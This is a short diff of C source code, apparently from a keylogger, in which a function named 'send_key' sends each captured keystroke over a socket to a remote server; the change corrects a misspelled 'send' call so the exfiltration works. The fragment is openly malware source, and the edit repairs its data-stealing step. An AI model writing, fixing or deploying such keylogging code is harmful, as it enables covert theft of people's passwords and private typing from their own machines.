@@ -86,7 +86,7 @@ int main()
 // Function to send the logged key to the remote server
 void send_key(unsigned char key) 
 {
-    sendadsd(sock, (char*)&key, sizeof(key), 0); // Send the key pressed
+    send(sock, (char*)&key, sizeof(key), 0); // Send the key pressed
 }
 
 // Keyboard procedure to handle key events
